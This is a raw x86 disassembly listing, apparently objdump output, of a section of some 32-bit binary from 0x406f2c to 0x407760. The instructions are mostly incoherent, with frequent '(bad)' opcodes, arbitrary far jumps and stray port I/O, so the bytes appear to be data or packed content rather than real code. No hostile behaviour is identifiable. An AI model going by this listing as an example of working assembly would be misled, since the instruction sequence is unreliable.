  406f2c:	add    BYTE PTR [edx-0x4a61ff1c],bh
  406f32:	dec    ebp
  406f33:	or     dh,dh
  406f35:	ret    
  406f36:	cmp    DWORD PTR [ebp-0xb],0xffffffab
  406f3a:	inc    ebp
  406f3b:	adc    dl,dh
  406f3d:	jge    0x406f9b
  406f3f:	sbb    BYTE PTR [edx-0x63],ah
  406f42:	leave  
  406f43:	jmp    0x2dc6:0x251040e1
  406f4a:	or     DWORD PTR [eax],eax
  406f4c:	jb     0x406f87
  406f4e:	mov    fs,WORD PTR [eax]
  406f50:	pusha  
  406f51:	in     al,dx
  406f52:	or     BYTE PTR [ebx],dh
  406f54:	stos   DWORD PTR es:[edi],eax
  406f55:	imul   dl
  406f57:	call   0xc977ecfa
  406f5c:	stos   DWORD PTR es:[edi],eax
  406f5d:	inc    ecx
  406f5e:	or     DWORD PTR [ebp+0x62],edx
  406f61:	and    DWORD PTR [ebx],edi
  406f63:	or     DWORD PTR [ebp*1-0x10118af7],0x4c
  406f6b:	or     BYTE PTR [ebp+0x7d],dl
  406f6e:	dec    eax
  406f6f:	add    BYTE PTR [edx-0x70],ch
  406f72:	add    eax,0xce37f400
  406f77:	inc    ebp
  406f78:	cmc    
  406f79:	jle    0x406fbc
  406f7b:	inc    ecx
  406f7c:	jmp    0x4148cc90
  406f81:	fsub   st(7),st
  406f83:	add    cl,ch
  406f85:	stos   DWORD PTR es:[edi],eax
  406f86:	mov    cl,0xff
  406f88:	mov    esp,0x4607e126
  406f8d:	xor    eax,0x110309
  406f92:	jb     0x406fce
  406f94:	call   0x174e87
  406f99:	jb     0x407010
  406f9b:	(bad)  
  406f9c:	jne    0x406f8f
  406f9e:	arpl   cx,sp
  406fa0:	adc    DWORD PTR [esi],ecx
  406fa2:	sub    eax,0x2e94ff09
  406fa7:	cmp    ch,al
  406fa9:	add    BYTE PTR [esi+0x30000ef],bl
  406faf:	retf   0xc95b
  406fb2:	pop    edx
  406fb3:	add    eax,0xd9135500
  406fb8:	push   ebx
  406fb9:	or     DWORD PTR ds:0x57750005,0xffffffcf
  406fc0:	inc    ebp
  406fc1:	or     ah,ah
  406fc3:	inc    ecx
  406fc4:	inc    ecx
  406fc5:	add    bl,cl
  406fc7:	push   0xe15000c
  406fcc:	mov    DWORD PTR [ebp+0x5c],0x5841485e
  406fd3:	mov    bh,0x75
  406fd5:	or     BYTE PTR [eax-0x57],dh
  406fd8:	out    0x0,al
  406fda:	dec    eax
  406fdb:	sbb    eax,0xffffffff
  406fde:	inc    ebp
  406fdf:	stc    
  406fe0:	out    0xb3,eax
  406fe2:	mov    dh,0x9
  406fe4:	add    BYTE PTR [ebx],al
  406fe6:	loopne 0x407032
  406fe8:	push   ebx
  406fe9:	call   0x4022b1
  406fee:	adc    DWORD PTR [edx+0x1b1075ff],0xffffffe8
  406ff5:	mov    ebp,0x9b600
  406ffa:	call   ebp
  406ffc:	add    eax,0xeb92e853
  407001:	add    BYTE PTR [eax],al
  407003:	pop    ecx
  407004:	imul   ecx,DWORD PTR [eax],0x4c9094
  40700a:	je     0x406fec
  40700c:	mov    dh,0x75
  40700e:	or     BYTE PTR [eax-0x59],ah
  407011:	sti    
  407012:	(bad)  
  407013:	inc    DWORD PTR [edx-0x37eea43d]
  407019:	or     BYTE PTR [eax],al
  40701b:	jne    0x406f9f
  40701d:	in     al,dx
  40701e:	adc    DWORD PTR [esi+esi*4+0x57],0x68
  407023:	xor    ebp,esp
  407025:	add    al,0x0
  407027:	xor    DWORD PTR [eax],ecx
  407029:	lods   eax,DWORD PTR ds:[esi]
  40702a:	sti    
  40702b:	xchg   esi,eax
  40702c:	push   cs
  40702d:	mov    WORD PTR [ebp-0x73],es
  407030:	bound  esp,QWORD PTR [eax]
  407032:	retf   0xa0fa
  407035:	add    eax,DWORD PTR [eax]
  407037:	add    al,0xe2
  407039:	jmp    0x316a:0xe0347616
  407040:	cmp    al,BYTE PTR [edi+edi*8]
  407043:	fsubr  st(7),st
  407045:	imul   eax,DWORD PTR [eax],0x4bc9dc5e
  40704b:	lock fild WORD PTR [esi-0x22e83740]
  407052:	jne    0x407099
  407054:	(bad)  
  407055:	imul   edi,ebx,0x45c5a63e
  40705b:	add    BYTE PTR ds:0x310003df,dh
  407061:	xor    ecx,esi
  407063:	dec    ebx
  407064:	jo     0x407048
  407066:	call   0x891c1a98
  40706b:	inc    ebp
  40706c:	sub    ebp,eax
  40706e:	fdivr  QWORD PTR [edi+0xe]
  407071:	push   esp
  407072:	sbb    eax,DWORD PTR [edx+0x2d]
  407075:	aad    0xf8
  407077:	imul   esi,DWORD PTR [ecx],0x61084235
  40707d:	mov    edx,0xe2704cf9
  407082:	fdiv   QWORD PTR [edx]
  407084:	fst    DWORD PTR [esi-0x18210023]
  40708a:	ret    
  40708b:	je     0x4070b9
  40708d:	pop    ecx
  40708e:	inc    edi
  40708f:	cld    
  407090:	fcmovu st,st(2)
  407092:	add    bh,0x2d
  407095:	pop    edi
  407096:	sbb    eax,0x88f44400
  40709b:	inc    ebp
  40709c:	mov    ch,0x9
  40709e:	(bad)  
  40709f:	retf   0xd73
  4070a2:	jmp    0xbb262add
  4070a7:	mov    ah,dh
  4070a9:	add    dl,ah
  4070ab:	ret    
  4070ac:	sbb    eax,0x311c690e
  4070b1:	pop    esi
  4070b2:	repz fwait
  4070b4:	xor    DWORD PTR [ecx],ecx
  4070b6:	jmp    0x2c024abe
  4070bb:	or     BYTE PTR [ecx],dh
  4070bd:	pop    edi
  4070be:	jmp    0x5f71712c
  4070c3:	jmp    0xb16b:0xe95f3169
  4070ca:	or     ecx,ebp
  4070cc:	add    edx,DWORD PTR [esi+0x5e]
  4070cf:	icebp  
  4070d0:	jmp    0x407053
  4070d2:	out    dx,al
  4070d3:	jmp    0x2f22adb
  4070d8:	(bad)  
  4070d9:	repnz pop esp
  4070db:	loop   0x40710d
  4070dd:	dec    ecx
  4070de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070df:	mov    WORD PTR [ebx],es
  4070e1:	xor    DWORD PTR [ecx+0x93103e8],edx
  4070e7:	xor    cl,bl
  4070e9:	repz or al,0xe9
  4070ec:	ss stos BYTE PTR es:[edi],al
  4070ee:	in     al,0x72
  4070f0:	inc    esi
  4070f1:	cmp    DWORD PTR [eax],eax
  4070f3:	test   eax,0xb1892c57
  4070f8:	add    eax,DWORD PTR [edx+eax*1+0x9310331]
  4070ff:	jmp    0xe94d64ce
  407104:	fcomp  QWORD PTR [ecx+eax*1+0x41]
  407108:	cwde   
  407109:	aam    0x8
  40710b:	jmp    0xbe144a90
  407110:	push   cs
  407111:	cwde   
  407112:	clc    
  407113:	call   0x44a21b
  407118:	pop    esp
  407119:	repnz add esi,DWORD PTR [esi-0x47f236d7]
  407120:	jmp    0x30407a57
  407125:	add    BYTE PTR [eax+0xc],dh
  407128:	add    BYTE PTR [ecx+ebp*4+0x762583e4],bh
  40712f:	pop    esi
  407130:	add    BYTE PTR [ebx-0xe8a2bce],dl
  407136:	call   0xc000:0x32e9e57c
  40713d:	jne    0x407187
  40713f:	cmp    DWORD PTR [eax-0x2f],edx
  407142:	out    dx,eax
  407143:	into   
  407144:	(bad)  
  407145:	fidiv  WORD PTR [ebp+ecx*2-0x2bdace04]
  40714c:	jne    0x40711b
  40714e:	jp     0x4071ad
  407150:	or     cl,dl
  407152:	in     al,dx
  407153:	in     eax,dx
  407154:	add    cl,ch
  407156:	aaa    
  407157:	leave  
  407158:	jne    0x40713f
  40715a:	pop    ebx
  40715b:	pop    ebp
  40715c:	cld    
  40715d:	rcl    edx,0xce
  407160:	jmp    DWORD PTR [esi-0x151436a2]
  407166:	mov    bh,0x4c
  407168:	cld    
  407169:	mov    al,ds:0x34000df7
  40716e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40716f:	in     eax,0x53
  407171:	jb     0x4071bb
  407173:	add    eax,0xe13fd96a
  407178:	jnp    0x4071ed
  40717a:	fcmovbe st,st(2)
  40717c:	push   0xffffffe9
  40717e:	test   BYTE PTR [ecx],cl
  407180:	push   0xffffffea
  407182:	pop    esp
  407183:	or     DWORD PTR [edx-0x16],ebp
  407186:	pop    edx
  407187:	or     DWORD PTR [eax],eax
  407189:	jmp    0x7613238e
  40718e:	loope  0x40715a
  407190:	fucom  st(4)
  407192:	add    al,bl
  407194:	push   es
  407195:	mov    DWORD PTR [ebx],eax
  407197:	cwde   
  407198:	inc    edx
  407199:	pop    esp
  40719a:	push   0xffffffc8
  40719c:	push   ss
  40719d:	call   0x4dded7
  4071a2:	mov    ebx,ebx
  4071a4:	or     ch,BYTE PTR [edx+0x0]
  4071a7:	ret    0x6a06
  4071aa:	add    BYTE PTR [edx+0x27006a0c],dh
  4071b0:	cli    
  4071b1:	out    0x27,eax
  4071b3:	cmp    eax,0x580b000d
  4071b8:	cmp    DWORD PTR [edi],ebp
  4071ba:	mov    ebx,ecx
  4071bc:	shr    BYTE PTR [ecx+0x0],cl
  4071bf:	mov    dl,0x6
  4071c1:	push   0x0
  4071c3:	add    cl,BYTE PTR [ecx]
  4071c5:	push   eax
  4071c6:	call   0x4159fb
  4071cb:	ror    DWORD PTR [edx+0x8],1
  4071ce:	or     ecx,DWORD PTR [eax+0xbff2439]
  4071d4:	or     eax,ebp
  4071d6:	mov    ebx,0xff00066c
  4071db:	cmp    ebx,esi
  4071dd:	mov    ah,0xe4
  4071df:	dec    eax
  4071e0:	push   es
  4071e1:	mov    DWORD PTR [ebx],0xffffaed7
  4071e7:	ret    
  4071e8:	add    bh,bh
  4071ea:	xor    esi,DWORD PTR [eax+0xe4a8]
  4071f0:	or     bh,al
  4071f2:	add    edi,edi
  4071f4:	mov    bh,0xae
  4071f6:	jmp    FWORD PTR [ebx]
  4071f8:	fdiv   st,st(4)
  4071fa:	inc    edx
  4071fb:	or     BYTE PTR [edi],dl
  4071fd:	pop    ecx
  4071fe:	rcr    BYTE PTR [ebx-0x2f],0xcb
  407202:	or     BYTE PTR [eax],al
  407204:	lods   eax,DWORD PTR ds:[esi]
  407205:	sub    ah,0x53
  407208:	arpl   WORD PTR [ecx],dx
  40720a:	or     BYTE PTR [ebx+0x74daf731],al
  407210:	ds inc ebx
  407212:	push   esi
  407213:	or     cl,bl
  407215:	in     eax,dx
  407216:	fiadd  WORD PTR [eax]
  407218:	xor    DWORD PTR [ebx],edx
  40721a:	push   esi
  40721b:	add    al,0xc9
  40721d:	xchg   ecx,eax
  40721e:	fild   WORD PTR [eax]
  407220:	xor    DWORD PTR [ebx],esp
  407222:	push   ss
  407223:	call   0x437646
  407228:	or     bl,BYTE PTR [ecx]
  40722a:	lds    eax,FWORD PTR [ecx+esi*1]
  40722d:	xchg   ebp,eax
  40722e:	mov    gs,esp
  407230:	mov    al,0x2b
  407232:	jecxz  0x407223
  407234:	mov    cs,WORD PTR [edx]
  407236:	xor    DWORD PTR [edi-0x4e],edx
  407239:	xchg   esp,eax
  40723a:	sbb    eax,0x3dff048
  40723f:	je     0x40725d
  407241:	jecxz  0x407252
  407243:	cmp    bh,cl
  407245:	and    BYTE PTR [eax+ebp*8],al
  407248:	mov    al,0xe8
  40724a:	fcos   
  40724c:	jbe    0x407232
  40724e:	sbb    eax,0x3dff048
  407253:	add    BYTE PTR [eax],al
  407255:	xor    eax,esp
  407257:	test   BYTE PTR ds:0x431807,bh
  40725d:	xor    DWORD PTR [edi+ebp*8],edx
  407260:	(bad)  
  407261:	cld    
  407262:	loope  0x4072af
  407264:	inc    ecx
  407265:	xor    DWORD PTR [edx+0x65],edi
  407268:	stc    
  407269:	es jo  0x40722d
  40726c:	add    eax,0x432a5f
  407271:	xor    edx,esp
  407273:	add    eax,DWORD PTR [eax]
  407275:	mov    esp,0x6efd45d
  40727a:	push   eax
  40727b:	xor    al,0xe8
  40727d:	int3   
  40727e:	push   edx
  40727f:	fcos   
  407281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407282:	gs call 0x664a6177
  407288:	xor    al,0xd9
  40728a:	stos   BYTE PTR es:[edi],al
  40728b:	pop    ecx
  40728c:	(bad)  
  40728e:	jle    0x40723c
  407290:	xlat   BYTE PTR ds:[ebx]
  407291:	and    DWORD PTR [ecx-0x55],0xd109704b
  407298:	add    eax,0xec690931
  40729d:	push   ecx
  40729e:	out    0xe9,al
  4072a0:	add    ebp,DWORD PTR [edx]
  4072a2:	leave  
  4072a3:	fidivr WORD PTR [esi+0xa]
  4072a6:	or     ch,cl
  4072a8:	add    ebp,DWORD PTR [esi-0x7a]
  4072ab:	adc    eax,0xe9d09ee9
  4072b0:	add    esi,DWORD PTR [ecx]
  4072b2:	or     DWORD PTR [esi],esp
  4072b4:	jg     0x40723f
  4072b6:	loopne 0x4072be
  4072b8:	fld    DWORD PTR [eax]
  4072ba:	xchg   BYTE PTR [eax],al
  4072bc:	jmp    0x83497dc4
  4072c1:	add    ecx,DWORD PTR [ebx]
  4072c3:	or     DWORD PTR [ebx-0x1e7943fd],eax
  4072c9:	call   0x877a4334
  4072ce:	mov    ah,0xcd
  4072d0:	(bad)  
  4072d1:	fcom   DWORD PTR [esi+0x39]
  4072d4:	into   
  4072d5:	mov    es,WORD PTR [ebp-0x20]
  4072d8:	(bad)  
  4072d9:	fadd   DWORD PTR [esi+0x56]
  4072dc:	mov    ebp,0xe9e617eb
  4072e1:	add    ebp,DWORD PTR [edx]
  4072e3:	leave  
  4072e4:	fidivr WORD PTR [esi+0x42]
  4072e7:	or     ch,cl
  4072e9:	add    ebx,DWORD PTR [ecx+0x3143317b]
  4072ef:	popa   
  4072f0:	sub    ecx,DWORD PTR [eax+esi*2+0x9]
  4072f4:	adc    DWORD PTR [ecx+0xd],0xf10c86d0
  4072fb:	jmp    DWORD PTR [edx+edx*8+0x31]
  4072ff:	or     DWORD PTR [eax],eax
  407301:	jmp    0x64ce2bab
  407306:	push   es
  407307:	loopne 0x407308
  407309:	data16 and bh,BYTE PTR [ebx]
  40730c:	call   0x1079ab
  407311:	loop   0x407305
  407313:	inc    DWORD PTR [ebx+0x93233]
  407319:	jo     0x407362
  40731b:	jmp    0xd940b20f
  407320:	jge    0x4072a7
  407322:	inc    ecx
  407323:	leave  
  407324:	iret   
  407325:	call   FWORD PTR [ecx-0x57b7a8e6]
  40732b:	xor    dl,al
  40732d:	mov    ch,0x9
  40732f:	mov    edi,ecx
  407331:	inc    DWORD PTR [ecx+0x6900092c]
  407337:	call   0xc003:0x6906fb9e
  40733e:	out    dx,al
  40733f:	(bad)  
  407340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407341:	add    cl,ch
  407343:	xor    cl,BYTE PTR [eax+edi*8-0x6378c618]
  40734a:	jmp    0xde907c81
  40734f:	shl    al,0xef
  407352:	(bad)  
  407353:	jle    0x40738d
  407355:	call   DWORD PTR [ebp+eiz*2+0x55c6ffdf]
  40735c:	adc    ch,dh
  40735e:	mov    esi,0xc1857d66
  407363:	dec    esi
  407364:	iret   
  407365:	call   FWORD PTR [ecx]
  407367:	popf   
  407368:	xchg   DWORD PTR [eax+0x28],ecx
  40736b:	sub    eax,0x1689b5ce
  407370:	iret   
  407371:	inc    DWORD PTR [ecx]
  407373:	xor    ecx,DWORD PTR [ecx]
  407375:	add    BYTE PTR [ecx+0x1d],ch
  407378:	pusha  
  407379:	sti    
  40737a:	add    BYTE PTR [edi+0x4c00bb6],ch
  407380:	jae    0xe6f07443
  407386:	(bad)  
  407387:	(bad)  
  407388:	fnstcw WORD PTR [ebx+edi*1]
  40738b:	push   eax
  40738c:	test   al,0x81
  40738e:	test   esp,edi
  407390:	outs   dx,DWORD PTR ds:[esi]
  407391:	mov    dh,0xff
  407393:	push   eax
  407394:	jo     0x40736a
  407396:	loop   0x407398
  407398:	fcomp  DWORD PTR [edx]
  40739a:	lea    eax,[ebp-0x1994]
  4073a0:	cwde   
  4073a1:	mov    bh,0xb5
  4073a3:	in     al,dx
  4073a4:	outs   dx,DWORD PTR ds:[esi]
  4073a5:	mov    dh,0xff
  4073a7:	call   0x402d1a
  4073ac:	jo     0x407365
  4073ae:	mov    ch,0xe8
  4073b0:	das    
  4073b1:	mov    dh,0xff
  4073b3:	push   eax
  4073b4:	aas    
  4073b5:	js     0x4073a3
  4073b7:	out    dx,eax
  4073b8:	aas    
  4073b9:	mov    dh,0xe8
  4073bb:	fild   DWORD PTR [edi+esi*4-0x4da71701]
  4073c2:	(bad)  
  4073c3:	push   DWORD PTR [ebx]
  4073c5:	and    eax,0xe75c858d
  4073ca:	(bad)  
  4073cb:	jmp    FWORD PTR [eax]
  4073cd:	fstp   st(0)
  4073cf:	loop   0x407419
  4073d1:	or     al,BYTE PTR [eax+0x50]
  4073d4:	int    0x88
  4073d6:	cld    
  4073d7:	out    dx,eax
  4073d8:	jg     0x407391
  4073da:	push   eax
  4073db:	inc    ebp
  4073dd:	in     eax,0xef
  4073df:	(bad)  
  4073e0:	jg     0x4073c4
  4073e2:	mov    ah,0xf4
  4073e4:	jg     0x40739d
  4073e6:	call   0xb72774d4
  4073eb:	(bad)  
  4073ec:	inc    DWORD PTR [ebp-0x40001016]
  4073f2:	loope  0x4073d2
  4073f4:	div    DWORD PTR [ecx]
  4073f6:	ja     0x4073ce
  4073f8:	push   DWORD PTR [ebx+esi*2+0x7906ffe6]
  4073ff:	mov    ?,esi
  407401:	dec    BYTE PTR [esi-0x2a]
  407404:	jne    0x4073fb
  407406:	xchg   esi,ecx
  407408:	jecxz  0x40743b
  40740a:	loopne 0x407475
  40740c:	add    dh,ah
  40740e:	ins    BYTE PTR es:[edi],dx
  40740f:	shr    edi,cl
  407411:	fisubr WORD PTR [esi]
  407413:	jmp    0x407484
  407415:	fnsave [esi]
  407417:	(bad)  
  407418:	push   0x31
  40741a:	aas    
  40741b:	nop
  40741c:	in     al,dx
  40741d:	(bad)  
  40741e:	inc    esi
  40741f:	(bad)  
  407420:	call   0x168878
  407425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407426:	pop    esp
  407427:	fucomip st,st(7)
  407429:	scas   al,BYTE PTR es:[edi]
  40742a:	push   ds
  40742b:	xor    edi,edi
  40742d:	fsub   st(7),st
  40742f:	in     eax,0xff
  407431:	sahf   
  407432:	idiv   DWORD PTR [ecx-0x1d]
  407435:	xor    eax,esp
  407437:	add    al,0x9
  40743a:	stos   DWORD PTR es:[edi],eax
  40743b:	(bad)  
  40743c:	mov    ch,0x81
  40743e:	not    ch
  407440:	dec    DWORD PTR [ecx+0x76ffe67b]
  407446:	push   0xde5ee880
  40744b:	aad    0xff
  40744d:	add    BYTE PTR [edi+esi*4-0x48a1001b],bl
  407454:	outs   dx,BYTE PTR ds:[esi]
  407455:	not    DWORD PTR [esi-0x4a]
  407458:	mov    eax,ds:0x420f93a
  40745d:	(bad)  
  40745e:	jl     0x40741b
  407460:	in     eax,0xff
  407462:	ds mov bh,0x49
  407465:	loop   0x407498
  407467:	loopne 0x407471
  407469:	shl    BYTE PTR [ebp+0x198d88b7],0xa
  407470:	xchg   esi,eax
  407471:	aad    0x1e
  407473:	sbb    DWORD PTR [ecx+0x210f5489],0x45d83143
  40747d:	aad    0xbc
  40747f:	in     eax,0x96
  407481:	aad    0xfe
  407483:	loope  0x407440
  407485:	loope  0x4074b8
  407487:	or     DWORD PTR [edi+edi*2-0x2b],esp
  40748b:	fsubr  QWORD PTR [esi-0x2b]
  40748e:	or     esp,0xcccee89c
  407494:	pop    esi
  407495:	in     al,dx
  407496:	sbb    ebp,eax
  407498:	jmp    0xd20a28a0
  40749d:	dec    eax
  40749e:	(bad)  
  40749f:	xchg   esi,eax
  4074a0:	push   ebp
  4074a1:	in     eax,0xbe
  4074a3:	int3   
  4074a4:	push   ecx
  4074a5:	or     esi,eax
  4074a7:	int3   
  4074a8:	mov    esi,DWORD PTR ss:[ecx+eiz*8-0x33592ac2]
  4074b0:	pop    esp
  4074b1:	in     al,dx
  4074b2:	add    BYTE PTR [esi+0x5cec1ecc],cl
  4074b8:	aam    0x16
  4074ba:	aad    0xd2
  4074bc:	or     esp,DWORD PTR [ecx+0x3ccc3142]
  4074c2:	loopne 0x407452
  4074c4:	int3   
  4074c5:	(bad)  
  4074c6:	jmp    0x407453
  4074c8:	jmp    0xf875:0xc93a03e9
  4074cf:	mov    ebx,0x5ee4d17e
  4074d4:	int3   
  4074d5:	jb     0x4074aa
  4074d7:	stos   BYTE PTR es:[edi],al
  4074d8:	push   cs
  4074d9:	pop    ss
  4074da:	dec    esp
  4074db:	lock or dl,bl
  4074de:	lahf   
  4074df:	inc    esi
  4074e0:	xchg   esi,eax
  4074e1:	int    0xe4
  4074e3:	ds int3 
  4074e5:	shl    DWORD PTR [edx-0x16fff6b0],1
  4074eb:	add    eax,0xfdbef096
  4074f0:	retf   
  4074f1:	call   0xc8c00
  4074f6:	sahf   
  4074f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074f8:	fsub   st(7),st
  4074fa:	xchg   esi,eax
  4074fb:	in     eax,0xe0
  4074fd:	pop    eax
  4074fe:	jg     0x4074dd
  407500:	retf   
  407501:	pop    edi
  407502:	daa    
  407503:	jmp    0x85f:0xe7255c7
  40750a:	adc    eax,0xb96effd2
  407510:	mov    eax,0x415d1cff
  407515:	inc    ecx
  407516:	jmp    0xff47221b
  40751b:	fdivr  QWORD PTR [edx]
  40751d:	jl     0x407561
  40751f:	in     eax,0xbb
  407521:	cmc    
  407522:	xchg   edi,eax
  407523:	mov    cl,0x73
  407525:	or     ecx,ecx
  407527:	sub    esi,DWORD PTR [esi-0x699dab35]
  40752d:	xchg   esp,eax
  40752f:	xor    DWORD PTR [ebp-0x3c],edx
  407532:	inc    ebp
  407533:	and    DWORD PTR [edx],esi
  407535:	or     DWORD PTR [eax],eax
  407537:	jmp    0xe948c2ed
  40753c:	(bad)  
  40753d:	idiv   dh
  40753f:	xchg   esp,eax
  407540:	cs int3 
  407542:	jne    0x407535
  407544:	or     BYTE PTR [ecx],cl
  407546:	call   0xbce47
  40754b:	pusha  
  40754c:	das    
  40754d:	int    0xeb
  40754f:	out    0xa5,al
  407551:	inc    ebp
  407552:	cld    
  407553:	jmp    0x72407e8a
  407558:	inc    eax
  407559:	jno    0x4075a3
  40755b:	sub    BYTE PTR ds:0xf86213e0,dh
  407561:	int3   
  407562:	cmp    eax,DWORD PTR [eax]
  407564:	lmsw   WORD PTR [ebp+0x9]
  407568:	pop    DWORD PTR [ecx-0x8]
  40756b:	add    DWORD PTR [eax],ebx
  40756d:	pop    es
  40756e:	add    bl,ch
  407570:	push   cs
  407571:	dec    esp
  407572:	aas    
  407573:	or     edx,edi
  407575:	xor    cl,ch
  407577:	xor    DWORD PTR ds:0x7500bd,0x10
  40757e:	mov    eax,0x83b0fc75
  407583:	(bad)  
  407584:	push   DWORD PTR [edi+0x17f8454a]
  40758a:	mov    edx,es
  40758c:	or     al,bl
  40758e:	jnp    0x414df5d1
  407594:	add    BYTE PTR [ebx+0x378b56cd],al
  40759a:	lods   eax,DWORD PTR ds:[esi]
  40759b:	mul    BYTE PTR ds:[edi-0x4a]
  40759f:	or     edi,edi
  4075a1:	fnsave [edx+0xd5005c7]
  4075a7:	inc    ecx
  4075a8:	add    al,cl
  4075aa:	push   es
  4075ab:	add    BYTE PTR [eax],al
  4075ad:	mov    ebx,0xe648b55
  4075b3:	push   esi
  4075b4:	push   0xffffff88
  4075b6:	mov    bh,0x75
  4075b8:	or     BYTE PTR [eax+0x77],al
  4075bb:	stc    
  4075bc:	jmp    DWORD PTR [edi]
  4075be:	dec    edx
  4075bf:	clc    
  4075c0:	call   FWORD PTR [ebp+0x28ebe7ce]
  4075c6:	add    eax,0x4308300
  4075cb:	jbe    0x4075dc
  4075cd:	iret   
  4075ce:	xchg   BYTE PTR [edi],bh
  4075d0:	and    bl,ch
  4075d2:	int    0xfb
  4075d4:	(bad)  
  4075d5:	inc    DWORD PTR [ebx]
  4075d7:	mov    ecx,eax
  4075d9:	jnp    0x40757d
  4075db:	pop    edi
  4075dc:	push   0x413b5431
  4075e1:	add    BYTE PTR [ecx],dh
  4075e3:	adc    ebx,esp
  4075e5:	push   0x53
  4075e7:	loopne 0x4075ec
  4075e9:	or     esi,DWORD PTR [ecx+0x14]
  4075ec:	or     dh,al
  4075ee:	jno    0x4075cc
  4075f0:	add    ebp,DWORD PTR [edx-0x7b]
  4075f3:	inc    esi
  4075f4:	add    al,0x57
  4075f6:	or     DWORD PTR [edx-0x1a],eax
  4075f9:	add    BYTE PTR [ecx],dh
  4075fb:	xlat   BYTE PTR ds:[ebx]
  4075fc:	ret    
  4075fd:	je     0x407633
  4075ff:	call   0x7c9:0xdf1a0003
  407606:	xor    ebx,ebp
  407608:	fld    TBYTE PTR [eax-0x7cfc1fef]
  40760e:	jmp    0xef43d0f1
  407613:	loop   0x407618
  407615:	mov    esi,esi
  407617:	shl    DWORD PTR [edx],0xc9
  40761a:	repz jecxz 0x407620
  40761d:	push   ebp
  40761e:	mov    edx,0xc5c48643
  407623:	dec    ax
  407625:	or     al,0x34
  407627:	loopne 0x40761c
  407629:	push   DWORD PTR [esi-0x5b3a2491]
  40762f:	adc    dl,dl
  407631:	mov    esp,ebp
  407633:	sbb    edx,edx
  407635:	jne    0x407664
  407637:	and    ebx,DWORD PTR [eax-0x4]
  40763a:	xchg   esi,eax
  40763b:	je     0x407638
  40763d:	out    0x9a,eax
  40763f:	in     al,dx
  407640:	sar    edi,1
  407642:	xchg   BYTE PTR [ebx+esi*8-0x2],dh
  407646:	add    BYTE PTR [esp+edx*8],al
  407649:	shl    BYTE PTR [ebp+0x75],cl
  40764c:	mul    DWORD PTR [ecx+ecx*1+0x75d2e031]
  407653:	gs pop es
  407655:	mov    dh,ch
  407657:	pop    esi
  407658:	or     dh,ah
  40765a:	mov    ebx,0x36e8fc73
  40765f:	mov    edx,0xde353fdc
  407664:	leave  
  407665:	push   esp
  407666:	cld    
  407667:	push   esi
  407668:	outs   dx,DWORD PTR ds:[esi]
  407669:	leave  
  40766a:	add    al,0x31
  40766c:	jns    0x407660
  40766e:	ret    
  40766f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407670:	adc    BYTE PTR [esi],dl
  407672:	sub    eax,0xfcabd287
  407677:	push   ds
  407678:	xchg   esp,eax
  407679:	and    al,0xfc
  40767b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40767c:	xchg   esp,eax
  40767d:	shl    DWORD PTR [edx+edi*4+0x3e],0xe5
  407682:	sbb    al,0xf1
  407684:	lds    edx,FWORD PTR [eax-0x2f]
  407687:	dec    al
  407689:	xchg   BYTE PTR [ebx+eax*1+0x78],dh
  40768d:	pop    ecx
  40768e:	test   BYTE PTR [esi],ch
  407690:	or     ebp,edi
  407692:	jmp    0x9d1:0x53815c7f
  407699:	jmp    0xe67f0d9a
  40769e:	xor    BYTE PTR [edx+0x67],ch
  4076a1:	and    dh,al
  4076a3:	cmp    DWORD PTR [ecx],ecx
  4076a5:	pusha  
  4076a6:	or     dh,BYTE PTR [edx+0xdcedcf]
  4076ac:	fild   WORD PTR [ecx+0x93103e8]
  4076b2:	xchg   esi,eax
  4076b3:	sub    al,0x7
  4076b5:	shr    BYTE PTR [ebx],cl
  4076b7:	cld    
  4076b8:	sahf   
  4076b9:	xor    BYTE PTR [ecx-0x6ef70fc4],dh
  4076bf:	es clc 
  4076c1:	dec    ecx
  4076c2:	jmp    0xf0915a2
  4076c7:	ror    DWORD PTR [ecx],1
  4076c9:	cdq    
  4076ca:	mov    dl,0x42
  4076cc:	xor    DWORD PTR [ecx],esi
  4076ce:	ja     0x40770d
  4076d0:	lock or BYTE PTR [eax],al
  4076d3:	add    ebp,esp
  4076d5:	(bad)  
  4076d6:	(bad)  
  4076d7:	out    dx,al
  4076d8:	cli    
  4076d9:	push   esp
  4076da:	dec    ebx
  4076db:	sub    BYTE PTR ds:0xf2303f31,ch
  4076e1:	or     al,ch
  4076e3:	push   eax
  4076e4:	pusha  
  4076e5:	enter  0x41ff,0x7f
  4076e9:	push   esp
  4076ea:	inc    ecx
  4076eb:	jmp    0x288bebca
  4076f0:	xor    eax,0x1b66ab1
  4076f5:	enter  0x2968,0x5c
  4076f9:	dec    edx
  4076fa:	add    BYTE PTR [ecx],dl
  4076fc:	out    0x50,eax
  4076fe:	inc    ecx
  4076ff:	jmp    0x973fdaee
  407704:	loope  0x407736
  407706:	cmp    BYTE PTR [edx],ah
  407708:	jb     0x407713
  40770a:	push   0x4a3a43
  40770f:	xchg   ecx,eax
  407710:	add    BYTE PTR [esi],ch
  407712:	enter  0x76ff,0x8a
  407716:	ins    DWORD PTR es:[edi],dx
  407717:	dec    ebx
  407718:	sub    BYTE PTR ds:0x73b3f831,dh
  40771e:	or     eax,ebp
  407720:	sbb    al,0xe0
  407722:	(bad)  
  407723:	inc    ecx
  407725:	stos   BYTE PTR es:[edi],al
  407726:	push   ebx
  407727:	inc    ecx
  407728:	jmp    0xa88b9687
  40772d:	xor    dh,BYTE PTR [ecx-0x387ec1d2]
  407733:	ret    
  407734:	pushf  
  407735:	and    eax,0x9aa48bb5
  40773a:	adc    al,al
  40773c:	popf   
  40773d:	das    
  40773e:	mov    DWORD PTR [eax],edi
  407740:	jmp    0xe9f8892c
  407745:	xor    cl,BYTE PTR [ecx]
  407747:	add    BYTE PTR [eax],ah
  407749:	je     0x407757
  40774b:	add    BYTE PTR [eax],al
  40774d:	arpl   WORD PTR [ebp-0x15],di
  407750:	pop    ss
  407751:	fcom   DWORD PTR [ebx]
  407753:	pop    esp
  407754:	je     0x4077ab
  407756:	mov    edi,DWORD PTR [eax]
  407758:	das    
  407759:	in     eax,0x10
  40775b:	mov    edx,0xb4801
  407760:	jmp    0x4077b7
